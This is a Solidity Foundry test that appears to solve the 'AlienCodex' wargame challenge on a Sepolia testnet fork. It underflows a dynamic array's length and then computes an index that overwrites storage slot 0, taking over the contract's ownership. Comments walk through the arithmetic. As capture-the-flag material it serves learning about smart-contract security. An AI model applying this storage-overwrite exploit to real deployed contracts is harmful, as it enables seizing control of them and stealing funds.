// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IAlienCodex {
    function owner() external view returns(address);
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract TestAlienCodex is Test {
    address private constant TARGET_ADDRESS = 0xBA8b47778AD9C6467E5B6528D69D3468CEdc80f2;
    IAlienCodex target;
    address attacker;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        target = IAlienCodex(TARGET_ADDRESS);
        attacker = makeAddr("attacker");
    }

    function testAlienCodex() public {
        address oldOwner = target.owner();

        vm.startPrank(attacker, attacker);
        target.makeContact();
        
        // retract: codex.lenght = 0 ---> 2^256 - 1, because old solidity version have unchecked arithmetics so 0 - 1 = 2^256 - 1
        target.retract();

        /**
         * p = slot of codex length
         * keccak(p) + i = storage slot of codex[i]
         * we need `i` such that codex[i] represents the storage slot of 0, because it's where owner is stores
         * so, keccak(p) + i = 0 --> i = -keccak(p) % 2^256 --> (2^256 - keccak(p)) --> (2^256 - 1) - keccak(p) + 1 --> uint256.max - keccak(p) + 1
         * therefore, codex[ uint256.max - keccak(p) + 1 ] = storage slot of 0 (owner's storage slot)
         */
        uint256 storageSlotOfCodexLength = 1; 
        uint256 storageSlotZeroIndex = type(uint256).max - uint256(keccak256(abi.encode(uint256(storageSlotOfCodexLength)))) + 1;
        target.revise(storageSlotZeroIndex, bytes32(uint256(uint160(attacker))));
        vm.stopPrank();

        address newOwner = target.owner(); // extracting the last 20 bytes

        console2.log("Old owner : ", oldOwner);
        console2.log("New owner : ", newOwner);

        assert(oldOwner != newOwner);
        assert(newOwner == attacker);
    }
}